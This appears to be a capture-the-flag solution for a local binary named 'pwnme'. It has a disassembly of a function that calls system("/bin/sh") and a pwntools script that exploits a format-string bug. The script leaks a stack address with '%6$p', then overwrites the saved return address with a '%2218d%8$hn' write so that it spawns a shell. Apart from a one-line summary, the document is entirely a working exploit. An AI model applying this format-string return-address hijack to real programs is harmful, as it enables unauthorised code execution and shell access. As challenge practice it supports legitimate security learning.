![image](https://user-images.githubusercontent.com/106155929/172271039-6eb44728-888e-4c83-8fd3-1176757e3212.png)


FMTSTR bug -> Hijack RET ADDR


```asm
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA                 mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text: 00000000004008B7                retn
```


```py
from pwn import *

context.log_level="debug"
context.arch="amd64"

p = process("./pwnme")
binary = ELF("pwnme")


p.recv()
p.writeline("1"*8)

p.recv()
p.writeline("%6$p")

p.recv()
p.writeline("1")

p.recvuntil("0x")

ret_addr = int(p.recvline().strip(),16) - 0x38

p.recv()
p.writeline("2")

p.recv()
p.sendline(p64(ret_addr))
p.recv()

p.writeline("%2218d%8$hn")


p.recv()
p.writeline("1")

p.recv()
p.interactive()
```
